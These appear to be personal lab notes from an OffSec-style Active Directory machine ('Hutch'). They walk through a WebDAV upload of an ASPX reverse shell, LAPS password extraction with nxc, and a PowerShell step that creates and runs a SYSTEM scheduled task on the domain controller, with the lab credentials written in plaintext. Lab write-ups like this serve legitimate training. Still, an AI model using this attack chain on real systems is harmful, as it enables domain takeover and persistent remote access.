![[Pasted image 20251217154936.png]]

what we can try is to access the webdav since its always a intersting path but we didnt have luck with null username 

we can try ldap 
![[Pasted image 20251217155351.png]]

we found one of the description had a password set string with a password so we tried with nxc to login smb , winrm and so we didnt have any luck

so i went back to see if its a valid credential for webdav 


![[Pasted image 20251217154734.png]]
so i tried to upload a simple hello.txt and i saw it in the web

hence we will upload a reverse shell since we saw earlier there is a .net messaging port so we are assuming its .net and there is some .aspx files in webdav so we will upload a .net revshell to ensure its execution


![[Pasted image 20251217154657.png]]


and we have a shell 

![[Pasted image 20251217155105.png]]

![[Pasted image 20251217155150.png]]

no we can check for priv escalation we start with winpeas


winpeas didnt find anything so what i did is sharphound and i found  lapspassword read 

```
nxc ldap 192.168.104.122 -d "hutch.offsec" -u "fmcsorley" -p "CrabSharkJellyfish192" --module laps  
```

then  
```
PS C:\windows\system32\inetsrv> $pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force
$pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force
PS C:\windows\system32\inetsrv>

PS C:\windows\system32\inetsrv> $creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
PS C:\windows\system32\inetsrv>

PS C:\windows\system32\inetsrv> Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
SUCCESS: The scheduled task "shell" has successfully been created.
PS C:\windows\system32\inetsrv>

PS C:\windows\system32\inetsrv> Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
```

### Refernce 
https://www.thehacker.recipes/ad/movement/dacl/readlapspassword